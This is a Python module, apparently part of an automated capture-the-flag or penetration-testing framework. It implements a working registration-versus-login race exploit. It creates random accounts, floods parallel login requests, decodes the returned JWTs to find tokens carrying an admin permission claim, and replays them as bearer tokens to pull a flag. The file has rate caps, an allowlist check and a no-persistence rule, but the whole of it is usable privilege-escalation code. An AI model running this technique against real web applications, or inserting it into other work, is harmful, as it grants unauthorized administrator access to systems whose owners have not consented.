"""Bounded exploit helper for source-proven registration permission races."""

from __future__ import annotations

import base64
import json
import random
import secrets
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from threading import Lock
from typing import Any, Callable, Dict, Optional
from urllib.parse import urljoin

import requests

from core.utils.flag_utils import find_first_flag
from core.utils.security import assert_url_allowed


RequestFunc = Callable[..., Any]


@dataclass
class RegistrationRaceResult:
    flag: Optional[str]
    attempts: int
    tokens_observed: int
    admin_candidates: int
    requests_sent: int
    auth_required: bool = False

    def sanitized_artifact(self) -> Dict[str, Any]:
        """Return persistence-safe telemetry; never retain credentials or JWTs."""
        return {
            "attempts": self.attempts,
            "tokens_observed": self.tokens_observed,
            "admin_candidates": self.admin_candidates,
            "requests_sent": self.requests_sent,
            "auth_required": self.auth_required,
            "captured_sensitive_values": False,
        }


class RegistrationPermissionRaceTool:
    """Race registration against login after source analysis proves the bug.

    The helper is deliberately narrow and bounded. It does not discover targets,
    bypass the network allowlist, or persist returned session tokens.
    """

    MAX_ATTEMPTS = 20
    MAX_LOGINS_PER_ATTEMPT = 100
    MAX_WORKERS = 64
    MAX_JITTER_SECONDS = 0.25

    def __init__(
        self,
        *,
        request_func: RequestFunc = requests.request,
        sleep_func: Callable[[float], None] = time.sleep,
        jitter_func: Callable[[float, float], float] = random.uniform,
    ) -> None:
        self._request = request_func
        self._sleep = sleep_func
        self._jitter = jitter_func

    @staticmethod
    def _jwt_claims(token: str) -> Dict[str, Any]:
        try:
            payload = token.split(".")[1]
            payload += "=" * (-len(payload) % 4)
            decoded = base64.urlsafe_b64decode(payload.encode("ascii"))
            value = json.loads(decoded.decode("utf-8"))
            return value if isinstance(value, dict) else {}
        except (IndexError, ValueError, UnicodeError, json.JSONDecodeError):
            return {}

    @staticmethod
    def _token_from_response(response: Any, token_field: str) -> Optional[str]:
        if getattr(response, "status_code", 0) != 200:
            return None
        try:
            body = response.json()
        except Exception:
            try:
                body = json.loads(getattr(response, "text", ""))
            except (TypeError, json.JSONDecodeError):
                return None
        token = body.get(token_field) if isinstance(body, dict) else None
        return token if isinstance(token, str) and token.count(".") == 2 else None

    def run(
        self,
        base_url: str,
        evidence: Dict[str, Any],
        *,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        attempts: int = 12,
        logins_per_attempt: int = 80,
        jitter_seconds: float = 0.18,
        timeout_s: float = 6.0,
    ) -> RegistrationRaceResult:
        attempts = max(1, min(int(attempts), self.MAX_ATTEMPTS))
        logins_per_attempt = max(
            2, min(int(logins_per_attempt), self.MAX_LOGINS_PER_ATTEMPT)
        )
        jitter_seconds = max(
            0.0, min(float(jitter_seconds), self.MAX_JITTER_SECONDS)
        )

        register_url = urljoin(base_url.rstrip("/") + "/", evidence["register_path"].lstrip("/"))
        login_url = urljoin(base_url.rstrip("/") + "/", evidence["login_path"].lstrip("/"))
        flag_url = urljoin(base_url.rstrip("/") + "/", evidence["flag_path"].lstrip("/"))
        for target in (register_url, login_url, flag_url):
            assert_url_allowed(target)

        request_headers = dict(headers or {})
        request_cookies = dict(cookies or {})
        username_field = evidence.get("username_field", "username")
        password_field = evidence.get("password_field", "password")
        token_field = evidence.get("token_field", "token")
        admin_claim = evidence.get("admin_claim", "perms")
        admin_value = evidence.get("admin_value", 0)
        extra_registration = dict(evidence.get("extra_registration") or {})
        flag_method = str(evidence.get("flag_method", "POST")).upper()

        total_tokens = 0
        total_admin_candidates = 0
        requests_sent = 0
        request_count_lock = Lock()

        def note_request() -> None:
            nonlocal requests_sent
            with request_count_lock:
                requests_sent += 1

        def send_registration(data: Dict[str, str]) -> Any:
            note_request()
            return self._request(
                "POST",
                register_url,
                data=data,
                headers=request_headers,
                cookies=request_cookies,
                timeout=timeout_s,
                allow_redirects=False,
            )

        def send_login(data: Dict[str, str]) -> Any:
            self._sleep(self._jitter(0.0, jitter_seconds))
            note_request()
            return self._request(
                "POST",
                login_url,
                data=data,
                headers=request_headers,
                cookies=request_cookies,
                timeout=timeout_s,
                allow_redirects=False,
            )

        for attempt in range(1, attempts + 1):
            username = "race_" + secrets.token_hex(8)
            password = "Race!" + secrets.token_urlsafe(12)
            register_data = {
                username_field: username,
                password_field: password,
                **extra_registration,
            }
            login_data = {username_field: username, password_field: password}

            responses = []
            registration_response = None
            workers = min(self.MAX_WORKERS, logins_per_attempt + 1)
            with ThreadPoolExecutor(max_workers=workers) as pool:
                registration_future = pool.submit(send_registration, register_data)
                login_futures = [
                    pool.submit(send_login, login_data)
                    for _ in range(logins_per_attempt)
                ]
                for future in as_completed(login_futures):
                    try:
                        responses.append(future.result())
                    except Exception:
                        continue
                try:
                    registration_response = registration_future.result()
                except Exception:
                    registration_response = None

            if getattr(registration_response, "status_code", 0) in {401, 403}:
                return RegistrationRaceResult(
                    flag=None,
                    attempts=attempt,
                    tokens_observed=total_tokens,
                    admin_candidates=total_admin_candidates,
                    requests_sent=requests_sent,
                    auth_required=True,
                )

            tokens = {
                token
                for response in responses
                if (token := self._token_from_response(response, token_field))
            }
            total_tokens += len(tokens)
            admin_tokens = [
                token
                for token in tokens
                if self._jwt_claims(token).get(admin_claim) == admin_value
            ]
            total_admin_candidates += len(admin_tokens)

            for token in admin_tokens:
                try:
                    note_request()
                    response = self._request(
                        flag_method,
                        flag_url,
                        headers={**request_headers, "Authorization": f"Bearer {token}"},
                        cookies=request_cookies,
                        timeout=timeout_s,
                        allow_redirects=False,
                    )
                except Exception:
                    continue
                flag = find_first_flag(getattr(response, "text", ""))
                if flag:
                    return RegistrationRaceResult(
                        flag=flag,
                        attempts=attempt,
                        tokens_observed=total_tokens,
                        admin_candidates=total_admin_candidates,
                        requests_sent=requests_sent,
                    )

        return RegistrationRaceResult(
            flag=None,
            attempts=attempts,
            tokens_observed=total_tokens,
            admin_candidates=total_admin_candidates,
            requests_sent=requests_sent,
        )
